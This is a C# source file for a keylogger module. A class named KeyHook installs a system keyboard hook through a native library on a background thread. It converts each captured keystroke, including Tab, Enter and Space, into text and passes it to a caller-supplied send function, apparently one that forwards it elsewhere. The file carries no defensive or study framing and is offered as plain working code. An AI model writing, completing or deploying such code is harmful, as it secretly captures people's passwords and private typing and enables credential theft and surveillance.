using System.Dynamic;
using System.Reflection.Metadata.Ecma335;
using System.Runtime.InteropServices;
using System.Globalization;
using System.Text;
using System.Diagnostics;
using System.Reflection.Metadata;
static class KeyHook{
    private static PSend? Send = null; 
    private static void HookProc(IntPtr data,ushort size,bool isUpper){
        string? str = Marshal.PtrToStringAuto(data,size);
        if(str is null)
            return;
        if(str.Length <= 1 && isUpper)
            str = str.ToUpper();
        if(str.Length <= 1 && !isUpper)
            str = str.ToLower();
        if(str == "\t")
            str = "TAB";
        else if(str == "\r")
            str = "ENTER";
        else if(str == " ")
            str = "SPACE";
        if(str.Length > 1)
            str = "[" + str + "]";
        Send?.Invoke(Encoding.Unicode.GetBytes(str),false);
    }
    [DllImport("liblnshared")] private static extern void SetKeyHook(Phook proc,ref bool isWork);
    public static bool isWork = false;
    public static void Start(PSend SenderFunc){
        if(isWork)
            return;
        isWork = true;
        Send = SenderFunc;
        Thread th = new Thread(delegate(){
            SetKeyHook(HookProc,ref isWork);
        });
        th.Start();
    }
    private delegate void Phook(IntPtr data,ushort size,bool isUpper);
    public delegate void PSend(byte[] data,bool force);
}